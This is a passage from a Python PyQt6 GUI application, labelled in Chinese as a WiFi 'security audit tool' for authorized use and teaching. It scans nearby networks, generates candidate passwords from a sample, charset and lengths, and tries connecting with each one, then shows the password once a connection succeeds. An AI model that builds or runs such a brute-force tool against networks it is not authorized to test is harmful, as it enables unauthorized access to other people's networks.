            "  WiFi 安全审计工具  —  仅用于授权安全审计与教学演示",
            "═" * 66, "",
            "使用说明：",
            "  1. 从下拉框选择目标 WiFi，或手动输入 SSID",
            "  2. 点击「🔄 扫描WiFi」可随时刷新可用 WiFi 列表",
            "  3. 填写样本密码，选择密码位数、字符集及排除选项",
            "  4. 密码框右侧实时显示当前尝试密码及成败指示（✕红色闪烁 / ✔绿色）",
            "  5. 进度条下方实时显示已用时与预计剩余时间（ETA）",
            "  6. 连接成功时将自动播放提示音并弹出通知", "",
        ]:
            self._log(t, "info")

    # ── 静态工具 ──────────────────────────────────────────────────────────────
    @staticmethod
    def _btn(text, obj) -> QPushButton:
        b = QPushButton(text)
        b.setObjectName(obj)
        b.setMinimumHeight(38)
        b.setCursor(QCursor(Qt.CursorShape.PointingHandCursor))
        return b

    @staticmethod
    def _divider() -> QFrame:
        f = QFrame()
        f.setFrameShape(QFrame.Shape.HLine)
        f.setStyleSheet("background:rgba(70,110,200,0.16); max-height:1px;")
        return f

    def _log(self, text, level="info"):
        color = {"info":"#a0bce8","success":"#3dd68c",
                 "warn":"#ffcc44","error":"#ff6060"}.get(level,"#a0bce8")
        safe = (text.replace("&","&amp;")
                    .replace("<","&lt;")
                    .replace(">","&gt;"))
        self.output.append(f'<span style="color:{color};">{safe}</span>')
        sb = self.output.verticalScrollBar()
        sb.setValue(sb.maximum())

    def _charset(self) -> str:
        buf = ""
        if self.cb_upper.isChecked():
            buf += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        if self.cb_lower.isChecked():
            buf += "abcdefghijklmnopqrstuvwxyz"
        if self.cb_digit.isChecked():
            buf += "0123456789"
        if self.cb_special.isChecked():
            buf += r"""!@#%^&*_-+=:"';,.?/\\()[]{}<>|~`$"""
        if self.cb_excl_sim.isChecked():
            for c in SIMILAR_CHARS:   buf = buf.replace(c, "")
        if self.cb_excl_amb.isChecked():
            for c in AMBIGUOUS_CHARS: buf = buf.replace(c, "")
        seen, out = set(), []
        for c in buf:
            if c not in seen: out.append(c); seen.add(c)
        return "".join(out)

    def _get_ssid(self) -> str:
        idx = self.ssid_combo.currentIndex()
        if idx >= 0:
            data = self.ssid_combo.itemData(idx)
            if data and (self.ssid_combo.currentText() ==
                         self.ssid_combo.itemText(idx)):
                return str(data)
        return self.ssid_combo.currentText().strip()

    # ── WiFi 扫描 ─────────────────────────────────────────────────────────────
    def _start_wifi_scan(self):
        if self.scan_thread and self.scan_thread.isRunning():
            return
        self.btn_scan.setEnabled(False)
        self.scan_status_lbl.setText("正在扫描...")
        self._log("📡 正在扫描周围可用 WiFi 信号...", "info")
        self.scan_thread = WifiScanThread()
        self.scan_thread.scan_finished.connect(self._on_scan_finished)
        self.scan_thread.start()

    def _on_scan_finished(self, results: list):
        self.btn_scan.setEnabled(True)
        current_text = self.ssid_combo.currentText().strip()
        self.ssid_combo.clear()
        if results:
            for ssid, signal in results:
                self.ssid_combo.addItem(f"{ssid}    ({signal}%)", userData=ssid)
            self.scan_status_lbl.setText(f"发现 {len(results)} 个WiFi")
            self._log(f"📡 扫描完成，发现 {len(results)} 个可用 WiFi：", "success")
            for i, (ssid, signal) in enumerate(results, 1):
                bar = "█" * (signal // 10) + "░" * (10 - signal // 10)
                self._log(
                    f"    {i:>2}. {ssid:<30s}  信号: {bar} {signal}%", "info"
                )
        else:
            self.scan_status_lbl.setText("未发现WiFi")
            self._log("📡 扫描完成，未发现可用 WiFi 网络。", "warn")

        if current_text:
            matched = next(
                (i for i in range(self.ssid_combo.count())
                 if self.ssid_combo.itemData(i) == current_text), -1
            )
            if matched >= 0:
                self.ssid_combo.setCurrentIndex(matched)
            else:
                self.ssid_combo.setCurrentText(current_text)

    # ── 计时 ──────────────────────────────────────────────────────────────────
    @staticmethod
    def _fmt_sec(seconds: float) -> str:
        if seconds < 0:
            return "--:--"
        s = int(seconds)
        h, r = divmod(s, 3600)
        m, s = divmod(r, 60)
        if h:   return f"{h}h {m:02d}m {s:02d}s"
        elif m: return f"{m}m {s:02d}s"
        else:   return f"{s}s"

    def _update_eta_display(self):
        elapsed = time.time() - self._attempt_start
        done    = self._attempt_done
        total   = self._attempt_total
        self.elapsed_lbl.setText(f"⏱ 已用时：{self._fmt_sec(elapsed)}")
        if done > 0 and total > 0:
            remain = (total - done) * (elapsed / done)
            self.eta_lbl.setText(f"ETA：{self._fmt_sec(remain)}")
        else:
            self.eta_lbl.setText("ETA：计算中...")

    # ── 连接成功 ──────────────────────────────────────────────────────────────
    def _on_success(self, pwd: str):
        play_success_sound()
        self._log("", "info")
        self._log("🎉 " + "═" * 48, "success")
        self._log(f"🎉  WiFi 连接成功！  密码：{pwd}", "success")
        self._log("🎉 " + "═" * 48, "success")
        QMessageBox.information(
            self, "连接成功 🎉",
            f"WiFi 连接成功！\n\n密码：{pwd}\n\n请妥善保管此密码。"
        )

    # ── 直接连接 ──────────────────────────────────────────────────────────────
    def direct_connect(self):
        ssid = self._get_ssid()
        pwd  = self.pwd_edit.text().strip()
        if not ssid or not pwd:
            QMessageBox.warning(self, "提示", "WiFi 名称和样本密码均不能为空")
            return
        self._log("", "info"); self._log("─" * 56, "info")
        self._log(f"[直接连接]  SSID：{ssid}   密码：{pwd}", "info")
        self._log(f"时间：{time.strftime('%Y-%m-%d %H:%M:%S')}", "info")
        self._log("─" * 56, "info")
        for w in (self.btn_direct, self.btn_start,
                  self.ssid_combo, self.pwd_edit):
            w.setEnabled(False)
        self.status_lbl.setText("直接连接中...")
        self.flash_lbl.show_trying(pwd)
        self.direct_thread = DirectConnectThread(ssid, pwd)
        self.direct_thread.status_signal.connect(lambda m, l: self._log(m, l))
        self.direct_thread.success_signal.connect(self._on_success)
        self.direct_thread.success_signal.connect(
            lambda p: self.flash_lbl.show_success(p)
        )
        self.direct_thread.finished.connect(self._on_direct_done)
        self.direct_thread.start()

    def _on_direct_done(self):
        if not (self.direct_thread and self.direct_thread._ok):
            self.flash_lbl.show_fail(self.pwd_edit.text().strip())
        for w in (self.btn_direct, self.btn_start,
                  self.ssid_combo, self.pwd_edit):
            w.setEnabled(True)
        self.status_lbl.setText("就绪")

    # ── 批量尝试 ──────────────────────────────────────────────────────────────
    def start_attempt(self):
        ssid    = self._get_ssid()
        sample  = self.pwd_edit.text().strip()
        lengths = self.len_sel.selected_values()
        charset = self._charset()
        if not ssid:
            QMessageBox.warning(self, "提示", "WiFi 名称不能为空"); return
        if not sample:
            QMessageBox.warning(self, "提示", "样本密码不能为空"); return
        if not lengths:
            QMessageBox.warning(self, "提示", "请至少选择一个密码长度"); return
        if not charset:
            QMessageBox.warning(self, "提示", "字符集为空，请检查选项"); return

        use_d = self.cb_digit.isChecked()
        use_l = self.cb_upper.isChecked() or self.cb_lower.isChecked()
        gen   = PasswordCandidateGenerator(charset, lengths, sample, use_d, use_l)
        high, low = gen.generate(max_high=300, max_low=300)
        if not high and not low:
            QMessageBox.warning(self, "提示", "无法生成候选密码"); return

        self._log("", "info"); sep = "═" * 66
        self._log(sep, "info")
        self._log(f"[开始尝试]  {time.strftime('%Y-%m-%d %H:%M:%S')}", "info")
        self._log(sep, "info")
        self._log(f"WiFi 名称：{ssid}", "info")
        self._log(f"样本密码：{sample}", "info")
        self._log(f"选择长度：{lengths}    字符集大小：{len(charset)}", "info")
        self._log(f"高频候选数：{len(high)}    低频候选数：{len(low)}", "info")
        self._log("", "info")
        self._log("字符频率分析（样本密码）：", "info")
        freq = Counter(sample)
        self._log(
            "  " + "  ".join(f"'{c}'×{n}" for c, n in freq.most_common()),
            "warn"
        )
        self._log("─" * 66, "info")

        for w in (self.btn_start, self.btn_direct,
                  self.ssid_combo, self.pwd_edit):
            w.setEnabled(False)
        self.btn_stop.setEnabled(True)

        total = len(high) + len(low)
        self._attempt_total = total
        self._attempt_done  = 0
        self._attempt_start = time.time()

        self.progress.setVisible(True)
        self.progress.setMaximum(total)
        self.progress.setValue(0)
        self.progress.setFormat("%p%  （%v / %m）")
        self.elapsed_lbl.setText("⏱ 已用时：0s")
        self.eta_lbl.setText("ETA：计算中...")
        self._elapsed_timer.start(1000)
        self.flash_lbl.clear_display()

        self.connect_thread = WifiConnectThread(ssid, high, low)
        self.connect_thread.status_signal.connect(lambda m, l: self._log(m, l))
        self.connect_thread.progress_signal.connect(self._on_progress)
        self.connect_thread.phase_signal.connect(self.phase_lbl.setText)
        self.connect_thread.success_signal.connect(self._on_success)
        self.connect_thread.trying_signal.connect(self.flash_lbl.show_trying)
        self.connect_thread.result_signal.connect(self._on_result)
        self.connect_thread.finished.connect(self._on_finished)
        self.connect_thread.start()
        self.status_lbl.setText(f"0 / {total}")

    def _on_result(self, pwd: str, success: bool):
        if success:
            self.flash_lbl.show_success(pwd)
        else:
            self.flash_lbl.show_fail(pwd)

    def stop_attempt(self):
        if self.connect_thread and self.connect_thread.isRunning():
            self.connect_thread.stop()
            self.status_lbl.setText("正在停止...")

    def _on_progress(self, cur: int, total: int, elapsed: float):
        self._attempt_done  = cur
        self._attempt_total = total
        self.progress.setMaximum(total)
        self.progress.setValue(cur)
        pct = int(cur / total * 100) if total else 0
        self.progress.setFormat(f"{pct}%  （{cur} / {total}）")
        self.status_lbl.setText(f"{cur} / {total}")

    def _on_finished(self):
        self._elapsed_timer.stop()
        elapsed = time.time() - self._attempt_start
        self._log("", "info"); self._log("═" * 66, "info")
        self._log(f"[尝试结束]  {time.strftime('%Y-%m-%d %H:%M:%S')}", "info")
        self._log(f"总耗时：{self._fmt_sec(elapsed)}", "info")
        self._log("═" * 66, "info")
        for w in (self.btn_start, self.btn_direct,
                  self.ssid_combo, self.pwd_edit):
            w.setEnabled(True)
        self.btn_stop.setEnabled(False)
        self.progress.setVisible(False)
        self.status_lbl.setText("就绪")
        self.phase_lbl.setText("")
        self.elapsed_lbl.setText(f"⏱ 总耗时：{self._fmt_sec(elapsed)}")
        self.eta_lbl.setText("✔ 完成")

    def clear_output(self):
        if QMessageBox.question(
            self, "确认", "确定要清空日志吗？",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        ) == QMessageBox.StandardButton.Yes:
            self.output.clear()
            self._log("═" * 66, "info")
            self._log("  日志已清空", "info")
            self._log("═" * 66, "info")


# ─────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setFont(QFont("Microsoft YaHei UI", 10))
    app_icon = _generate_app_icon()
    app.setWindowIcon(app_icon)
    try:
        import ctypes
        ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(
            "WifiAuditTool.MainWindow.1.0"
        )
    except Exception:
        pass
    win = WifiToolWindow()
    win.showMaximized()
    sys.exit(app.exec())